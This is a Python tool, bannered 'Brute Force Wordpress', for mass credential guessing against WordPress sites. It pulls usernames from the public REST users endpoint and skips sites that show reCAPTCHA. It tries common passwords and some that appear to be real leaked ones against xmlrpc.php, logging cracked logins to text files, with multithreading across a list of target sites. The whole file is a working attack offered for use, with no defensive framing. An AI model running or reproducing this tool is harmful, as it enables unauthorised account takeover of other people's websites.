import sys
import os
import re
import random
import string
from multiprocessing.dummy import Pool
import requests
from requests.packages.urllib3.exceptions import InsecureRequestWarning
from colorama import Fore
from colorama import init
import binascii
import codecs
import uuid 
import hashlib
from colorama import Fore
from colorama import init
from colorama import Fore, init
# Disable SSL warnings
requests.packages.urllib3.disable_warnings(InsecureRequestWarning)


init(autoreset=True)



def print_banner():
    fr = Fore.RED
    banner = f'''
    {fr}
                                  Brute Force Wordpress 
                                                     
    \n
    '''
    print(banner)

print_banner()


def bdkrtoolsb():
    
    total = []
    
    try:
        # Read targets from the command line argument
        with open(sys.argv[1], mode='r') as file:
            target = [line.strip() for line in file.readlines()]
    except IndexError:
        path = os.path.basename(sys.argv[0])
        exit(f'\n  [!] Enter <{path}> <sites.txt>')
    
    # Common headers
    headers = {
        'Connection': 'keep-alive',
        'Cache-Control': 'max-age=0',
        'Upgrade-Insecure-Requests': '1',
        'User-Agent': 'Mozilla/5.0 (Linux; Android 7.0; SM-G892A Build/NRD90M; wv) AppleWebKit/537.36 (KHTML, like Gecko) Version/4.0 Chrome/60.0.3112.107 Mobile Safari/537.36',
        'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,image/apng,*/*;q=0.8',
        'Accept-Encoding': 'gzip, deflate',
        'Accept-Language': 'en-US,en;q=0.9,fr;q=0.8',
        'referer': 'www.google.com'
    }
    
    def URLdomain(site):
        # Simplify URL formatting
        site = site.rstrip()
        if not site.startswith('http://') and not site.startswith('https://'):
            site = f'http://{site}'
        if not site.endswith('/'):
            site += '/'
        return site
    
    def id_generator(size=8, chars=string.ascii_uppercase + string.ascii_lowercase + string.digits):
        return ''.join(random.choice(chars) for _ in range(size))
    
    def informations(url):
        try:
            exploit_page = f"{url}/wp-json/wp/v2/users"
            exploit_1 = requests.get(exploit_page, headers=headers, timeout=15)
            if 'slug' in exploit_1.text:
                exploit = exploit_1.text
                usernames = re.findall('"name":"(.*?)"', exploit)
                for username in usernames:
                    signs = ['Archive', 'Archives', 'Author', 'Home', ',', ';', '\\']
                    if any(sign in username for sign in signs):
                        continue
                    pas = [username + username, username, 'Password', 'useruser', '12345678', '12345', 'abc123', 'passw0rd', '123456', 'qwerty123', 'admin123', 'admin1234', 'admin12345',
                           'admin123456', 'admin1234567', 'Admin123', 'Admin1234', 'Admin12345', 'Admin123456',
                           'Admin1234567', 'admin', 'Admin', 'User123456', 'admin@123', 'password123', username,
                           username]
                    for password in pas:
                        if xlmprc(url, username, password):
                            with open('Successfully_logged_WordPress.txt', 'a') as f:
                                f.write(f"{url}/wp-login.php#{username}@{password}\n")
                            return True
            else:
                default_username = 'admin'
                print(f'[Login] : {url} [Not Vuln Get Username will Use default_username]\n')
                pas = ['Password', 'useruser', 'web.de@milko2009.', 'dani160781', 'Manubl_2986', 'favourenyark1122', 'ovlas.11', 'Odpasscode-123', 'qwerty123', 'admin123', 'admin1234', 'Teckniumberga2911',
                       'Sulejman1981', 'ficakica69', 'Admin123', 'a9TXlxPU9RToPLge', 'Katya1234', 'milko2009.', 'Katya1234', 'milko2009.',
                       'Admin1234567','KX6lXsNwpFaUDtvatE%00EIb', 'Cl3m3nt32021', 'admin@123', 'b#MSWo1*L$uVPx(3STIUbpUm']
                for password in pas:
                    if xlmprc(url, default_username, password):
                        with open('Login-xmlrpc.txt', 'a') as f:
                            f.write(f"{url}/wp-login.php#{default_username}@{password}\n")
                        return True
        except Exception as e:
            print(f"Error in informations: {e}")
        return False
    
    def xlmprc(url, username, password):
        try:
            post_load = requests.post(
                f"{url}/xmlrpc.php",
                data=f"<methodCall><methodName>wp.getUsersBlogs</methodName><params><param><value>{username}</value></param><param><value>{password}</value></param></params></methodCall>",
                headers=headers, timeout=15
            )
            post_content = post_load.content.decode('utf-8')  # Decode the content to string
            if 'blogName' in post_content:
                print(f'[xmlrpc] : {url} : {username} : {password} [Successful]')
                return True
            else:
                print(f'[xmlrpc] : {url} : {username} : {password} [Field]')
                
        except Exception as e:
            print(f"Error in xlmprc: {e}")
        return False
    

    
    def cleaner(url):
        try:
            if 'http://' in url or 'https://' in url:
                url = url.replace('http://', '').replace('https://', '')
                pointer = url.split('.')
                password = pointer[1] if 'www' in pointer else pointer[0]
                bruteforce(url, password)
        except Exception as e:
            print(f"Error in cleaner: {e}")
    
    def bruteforce(url, password):
        pass
    

    def main(url):
        try:
            total.append(url)
            os.system(f'title Total Websites  : {str(len(total))}')
            url = URLdomain(url)
            login_response = requests.get(f'{url}/wp-login.php', headers=headers, timeout=30)
            login_content = login_response.content.decode('utf-8')  # Decode the content to string
            if 'recaptcha-checkbox' not in login_content:
                if 'wp-submit' in login_content:
                    if informations(url):
                       cleaner(url)
        except Exception as e:
            print(f"Error in main: {e}")
    
        return True
    
    
    mp = Pool(10)
    mp.map(main, target)
    mp.close()
    mp.join()



if __name__ == "__main__":
    bdkrtoolsb()
